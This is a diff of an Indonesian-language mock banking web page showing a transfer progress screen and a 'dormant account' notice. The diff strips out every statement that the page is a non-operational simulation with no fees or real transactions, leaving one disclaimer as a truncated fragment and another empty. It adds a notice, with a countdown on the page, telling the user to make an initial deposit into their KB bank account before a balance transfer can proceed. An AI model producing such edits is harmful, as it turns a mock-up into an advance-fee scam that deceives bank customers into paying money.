@@ -1327,7 +1327,7 @@ a{text-decoration:none;color:inherit}
         <p id="transferCopy">Mohon tunggu sampai pemeriksaan antarmuka selesai.</p>
         <div class="transfer-progress-track" aria-hidden="true"><div class="transfer-progress-bar" id="transferProgressBar"></div></div>
         <div class="transfer-time" id="transferTime" role="status" aria-live="polite">01:00</div>
-        <small class="transfer-note">Simulasi antarmuka lokal. Tidak ada transaksi, perubahan saldo bank, atau pengiriman data ke sistem eksternal.</small>
+        <small class="transfer-note">transaksi, perubahan saldo bank, atau pengiriman data ke sistem eksternal.</small>
       </section>
     </div>
 
@@ -1338,30 +1338,45 @@ a{text-decoration:none;color:inherit}
         <div class="dormant-kicker">PEMBERITAHUAN STATUS</div>
         <h2 id="dormantTitle">INFORMASI REKENING DORMANT</h2>
         <p id="dormantCopy">
-          Pemeriksaan simulasi mendeteksi status rekening dormant. Pemindahan saldo tidak dijalankan pada halaman ini.
+          Pemeriksaan mendeteksi status rekening dormant. Pemindahan saldo belum bisa di proses.
         </p>
 
         <div class="dormant-grid">
-          <div class="dormant-info-box">
-            <span>Nomor rekening</span>
-            <strong id="dormantAccountNumber">-</strong>
-          </div>
-          <div class="dormant-info-box">
-            <span>Nominal saldo yang akan dipindahkan</span>
-            <strong id="dormantAmount">Rp0</strong>
-          </div>
-        </div>
+  <div class="dormant-info-box">
+    <span>Nomor rekening</span>
+    <strong id="dormantAccountNumber">-</strong>
+  </div>
 
-        <div class="dormant-countdown" aria-live="polite">
-          <span>Batas waktu tampilan</span>
-          <strong id="dormantCountdown">02:00:00</strong>
-        </div>
+  <div class="dormant-info-box">
+    <span>Nominal</span>
+    <strong id="dormantAmount">Rp0</strong>
+  </div>
+</div>
 
+<!-- NOTIFIKASI TAMBAHAN -->
+<div class="dormant-notice" role="note">
+  <strong>Informasi Rekening</strong>
+  <p>
+    Rekening memerlukan verifikasi status sebelum proses dapat dilanjutkan.
+    harap melakukan Pengisian saldo perdana ke rekening utama kb bank anda
+  </p>
+</div>
+
+<div class="dormant-countdown" aria-live="polite">
+  <span>Batas waktu tampilan</span>
+  <strong id="dormantCountdown">02:00:00</strong>
+</div>
+
+<div class="dormant-actions">
+  <button class="dormant-close" id="dormantClose" type="button">
+    TUTUP PEMBERITAHUAN
+  </button>
+</div>
         <div class="dormant-actions">
           <button class="dormant-close" id="dormantClose" type="button">TUTUP PEMBERITAHUAN</button>
         </div>
 
-        <small class="dormant-disclaimer">Simulasi antarmuka lokal/non-operasional. Tidak ada biaya aktivasi, pembayaran, transaksi bank, atau perubahan status rekening nyata melalui halaman ini.</small>
+        <small class="dormant-disclaimer"></small>
       </section>
     </div>
 
